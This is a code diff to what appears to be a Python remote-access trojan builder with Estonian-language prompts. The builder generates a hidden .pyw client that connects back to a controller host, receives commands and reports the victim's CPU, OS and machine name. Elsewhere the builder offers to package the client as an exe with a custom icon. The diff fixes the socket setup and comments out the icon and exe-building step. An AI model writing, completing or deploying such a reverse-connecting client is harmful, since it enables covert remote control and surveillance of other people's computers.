@@ -21,13 +21,15 @@ import os
 import requests
 from platform import *
 
-s = socket.socket(socket.SOCK_STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = """+'"'+host+'"'+"""
 port = """+str(port)+"""
 
 s.connect((host, port))
 
 while True:
+    output = ''
+    data = ''
     data = s.recv(4096).decode()
     if data == "os":
         s.send("CPU: {}, OS: {} {}, Machine name: {}".format(machine(),system(),release(),node()).encode())
@@ -49,7 +51,7 @@ print("Uhendus katkes")
 """)
    clientMake.close()
    os.rename("client.txt", "client.pyw")
-   iconAsk = input("Kas soovid failile ikooni?[Y/N] ")
+   """iconAsk = input("Kas soovid failile ikooni?[Y/N] ")
    if iconAsk == "Y" or iconAsk == "y":
       urlAsk = input("Sisesta ikooni nimi: ")
    else:
@@ -92,7 +94,7 @@ print("Uhendus katkes")
          os.rmdir("dist")
       except:
          pass
-   print("Exe fail genereeritud!")
+   print("Exe fail genereeritud!")"""
                     
 s.bind((host, port))
 
